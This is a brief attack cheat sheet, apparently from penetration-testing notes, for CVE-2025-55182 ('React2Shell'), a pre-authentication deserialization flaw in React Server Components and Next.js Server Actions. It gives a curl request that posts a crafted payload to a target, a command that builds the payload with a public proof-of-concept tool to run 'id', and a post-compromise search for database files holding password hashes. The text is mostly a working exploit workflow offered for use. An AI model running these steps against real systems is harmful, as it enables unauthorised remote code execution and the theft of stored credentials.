# React Server Components Deserialization RCE (React2Shell)

React Server Components serialize/deserialize "server actions" via a binary RSC payload. Pre-auth flaw: the server deserializes attacker-controlled data from server function requests without verifying the caller, allowing arbitrary code execution.

CVE-2025-55182 affects specific React + NextJS configurations using Server Actions with unsafe deserialization.

```bash
# Identify: look for Content-Type: text/x-component or RSC payloads in responses
# The vulnerable endpoint accepts POST with serialized RSC action data
curl -X POST http://<TARGET>/ \
  -H 'Content-Type: text/x-component' \
  -H 'Next-Action: <action-id>' \
  --data-binary @payload.bin
```

Craft payload with `react2shell` PoC tool (public exploit):
```bash
python3 react2shell.py -u http://<TARGET> -c 'id' -o payload.bin
```

Post-shell: check `/app/` or `/var/www/` for SQLite/Postgres DB with password hashes:
```bash
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
```
